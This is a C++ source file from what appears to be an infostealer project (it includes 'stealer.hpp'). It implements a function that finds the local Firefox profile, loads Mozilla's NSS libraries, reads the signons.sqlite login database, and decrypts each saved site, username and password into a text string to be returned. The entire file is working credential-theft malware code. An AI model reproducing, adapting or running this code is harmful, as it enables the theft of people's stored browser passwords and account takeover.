#include "../stealer.hpp"

string GetFireFoxPasswords ( API* api, string appdata ) {
	string returnedData = "";
	try {
		HMODULE hLibs[8];
		SECItem sec, secDec;
		NSS_Init _NSS_Init;
		PK11_GetInternalKeySlot _PK11_GetInternalKeySlot;
		PK11_Authenticate _PK11_Authenticate;
		NSSBase64_DecodeBuffer _NSSBase64_DecodeBuffer;
		PK11SDR_Decrypt _PK11SDR_Decrypt;
		PK11_FreeSlot _PK11_FreeSlot;
		NSS_Shutdown _NSS_Shutdown;
		sqlite3_open _sqlite3_open;
		sqlite3_close _sqlite3_close;
		sqlite3_prepare_v2 _sqlite3_prepare_v2;
		sqlite3_step _sqlite3_step;
		sqlite3_column_text _sqlite3_column_text;
		sqlite3 *ppDb;
		sqlite3_stmt *ppStmt;
		const char **pzTail = '\0';
		DWORD *keyslot;
		
		string FFVer			= ReadRegistryKey (api, HKEY_LOCAL_MACHINE, "SOFTWARE\\Mozilla\\Mozilla Firefox", "CurrentVersion");
		string InstallPathKey	= "SOFTWARE\\Mozilla\\Mozilla Firefox\\" + FFVer + "\\Main";
		string FFPath			= ReadRegistryKey (api, HKEY_LOCAL_MACHINE, InstallPathKey.c_str(), "Install Directory");

		string DLLs[8];
		DLLs[0] = FFPath + "\\mozcrt19.dll";
		DLLs[1] = FFPath + "\\sqlite3.dll";
		DLLs[2] = FFPath + "\\nspr4.dll";
		DLLs[3] = FFPath + "\\plc4.dll";
		DLLs[4] = FFPath + "\\plds4.dll";
		DLLs[5] = FFPath + "\\nssutil3.dll";
		DLLs[6] = FFPath + "\\softokn3.dll";
		DLLs[7] = FFPath + "\\nss3.dll";
			
		for (int i = 0; i < 8; i++) {
			hLibs[i] = LoadLibrary (DLLs[i].c_str());
		}

		_NSS_Init = (NSS_Init)api->zzGetProcAddress (hLibs[7], "NSS_Init");
		_PK11_GetInternalKeySlot = (PK11_GetInternalKeySlot)api->zzGetProcAddress (hLibs[7], "PK11_GetInternalKeySlot");
		_PK11_Authenticate = (PK11_Authenticate)api->zzGetProcAddress (hLibs[7], "PK11_Authenticate");
		_NSSBase64_DecodeBuffer = (NSSBase64_DecodeBuffer)api->zzGetProcAddress (hLibs[7], "NSSBase64_DecodeBuffer");
		_PK11SDR_Decrypt = (PK11SDR_Decrypt)api->zzGetProcAddress (hLibs[7], "PK11SDR_Decrypt");
		_PK11_FreeSlot = (PK11_FreeSlot)api->zzGetProcAddress (hLibs[7], "PK11_FreeSlot");
		_NSS_Shutdown = (NSS_Shutdown)api->zzGetProcAddress (hLibs[7], "NSS_Shutdown");
		_sqlite3_open = (sqlite3_open)api->zzGetProcAddress (hLibs[1], "sqlite3_open");
		_sqlite3_close = (sqlite3_close)api->zzGetProcAddress (hLibs[1], "sqlite3_close");
		_sqlite3_prepare_v2 = (sqlite3_prepare_v2)api->zzGetProcAddress (hLibs[1], "sqlite3_prepare_v2");
		_sqlite3_step = (sqlite3_step)api->zzGetProcAddress (hLibs[1], "sqlite3_step");
		_sqlite3_column_text = (sqlite3_column_text)api->zzGetProcAddress (hLibs[1], "sqlite3_column_text");
		string profilePath;
		string thisfile = appdata;
		string profileData = GetFileData(api, (thisfile.substr(0, thisfile.find_last_of('\\')) + "\\Mozilla\\Firefox\\profiles.ini"));
		/*if (!api->fileExists(profileData))
			return "";*/
		int index = profileData.find("Path=Profiles");
		profilePath = (thisfile.substr(0, thisfile.find_last_of('\\')) + "\\Mozilla\\Firefox\\Profiles\\" + (profileData.substr(index + 14, profileData.find_first_of('.', index + 14))));
		string signonsFile = profilePath + "\\signons.sqlite";
		_sqlite3_open (signonsFile.c_str(), &ppDb);
		_sqlite3_prepare_v2 (ppDb, "select *  from moz_logins", lstrlen ("select *  from moz_logins"), &ppStmt, pzTail);
		char dataF[200] = "\0";
		if (_NSS_Init (profilePath.c_str()) == 0) {
			keyslot = _PK11_GetInternalKeySlot ();
			if (keyslot != 0) {
				if (_PK11_Authenticate (keyslot, 1, NULL) == 0){							
					do {
						if (_sqlite3_column_text (ppStmt, 1) != 0) {
							string data = "";
							api->wsprintf(dataF, "FF: %s | \0", _sqlite3_column_text (ppStmt, 1));
							data = (char*)_sqlite3_column_text(ppStmt, 6);
							_NSSBase64_DecodeBuffer (NULL, &sec, data.c_str(), data.length());
							_PK11SDR_Decrypt (&sec, &secDec, NULL);					
							if (sec.len <= 0)
								continue;
							api->lstrcat(dataF, (char*)secDec.data);
							api->lstrcat(dataF, ":");
							data = (char*)_sqlite3_column_text(ppStmt, 7);
							_NSSBase64_DecodeBuffer (NULL, &sec, data.c_str(), data.length());
							_PK11SDR_Decrypt (&sec, &secDec, NULL);					
							if (sec.len <= 0)
								continue;
							secDec.data[secDec.len] = '\0';
							api->lstrcat(dataF, (char*)secDec.data);
							api->lstrcat(dataF, "\n\0");
							returnedData += dataF;
						}
					} while (_sqlite3_step (ppStmt) == 100);
					
				} 
				_PK11_FreeSlot (keyslot);
			}
			_NSS_Shutdown ();
		}
		_sqlite3_close (ppDb);
		for (int j = 0; j < 8; j++) {
			FreeLibrary (hLibs[j]);
		}
	} catch (...) {
	}

	return returnedData;
}